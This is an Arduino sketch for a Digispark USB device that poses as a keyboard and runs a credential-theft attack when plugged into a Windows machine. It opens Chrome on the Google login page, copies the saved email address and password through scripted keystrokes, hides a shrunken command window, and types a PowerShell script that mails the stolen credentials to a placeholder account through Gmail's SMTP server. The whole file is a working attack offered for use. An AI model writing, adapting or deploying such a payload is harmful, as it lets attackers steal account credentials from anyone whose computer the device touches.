#include "DigiKeyboard.h"
#include <avr/pgmspace.h>

//Load string into RAM only when needed
const char line1[] PROGMEM = "$ser='smtp.gmail.com';";
const char line2[] PROGMEM = "$msg=New-Object Net.Mail.MailMessage;";
const char line3[] PROGMEM = "$smtp=New-Object Net.Mail.SmtpClient($ser);";
const char line4[] PROGMEM = "$smtp.EnableSsl=$True;";
const char line5[] PROGMEM = "$smtp.Credentials=New-Object System.Net.NetworkCredential('<email>','<password>');"; //If your email is example_email@gamil.com, use example_email (Gmail only)
const char line6[] PROGMEM = "$msg.From='<email_from>';$msg.To.Add('<email_to>');$msg.Subject='Pass';";
const char line7[] PROGMEM = "$msg.Body=$m;$smtp.Send($msg);";
const char line8[] PROGMEM = "\"&exit\n";
char buffer[100];
#define GetPsz( x ) (strcpy_P(buffer, (char*)x))

//Load characters into RAM
void printText( char * txt ) {
  int l = strlen(txt);
  for (int i = 0; i < l; i++) {
    DigiKeyboard.print( txt[i] );
    DigiKeyboard.update();
  }
}

void setup() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("chrome");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("accounts.google.com/Login");
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(67,MOD_SHIFT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(82);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("");
  DigiKeyboard.delay(1000);
  //Steal Email
  DigiKeyboard.sendKeyStroke(82);
  DigiKeyboard.sendKeyStroke(82);
  DigiKeyboard.sendKeyStroke(82);
  DigiKeyboard.sendKeyStroke(59);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(4,MOD_CONTROL_LEFT);
  DigiKeyboard.sendKeyStroke(6,MOD_CONTROL_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("mode con: cols=16 lines=1&color FE");
  DigiKeyboard.delay(100);
  DigiKeyboard.print("powershell \"$u='");
  DigiKeyboard.sendKeyStroke(25,MOD_CONTROL_LEFT);
  DigiKeyboard.print("';");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(43,MOD_ALT_LEFT);
  //Steal Password
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(81);
  DigiKeyboard.sendKeyStroke(81);
  DigiKeyboard.sendKeyStroke(81);
  DigiKeyboard.println("");
  DigiKeyboard.print("\t\t");
  DigiKeyboard.println("text");
  DigiKeyboard.sendKeyStroke(69);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(4,MOD_CONTROL_LEFT);
  DigiKeyboard.sendKeyStroke(6,MOD_CONTROL_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(61,MOD_ALT_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$p='");
  DigiKeyboard.sendKeyStroke(25,MOD_CONTROL_LEFT);
  DigiKeyboard.print("';");
  //Email Username and Password
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$m='Username: '+$u+' Password: '+$p;");
  DigiKeyboard.delay(100);
  printText( GetPsz (line1) );
  printText( GetPsz (line2) );
  printText( GetPsz (line3) );
  printText( GetPsz (line4) );
  printText( GetPsz (line5) );
  printText( GetPsz (line6) );
  printText( GetPsz (line7) );
  printText( GetPsz (line8) );
  DigiKeyboard.sendKeyStroke(81,MOD_GUI_LEFT);
}

void loop() {
}
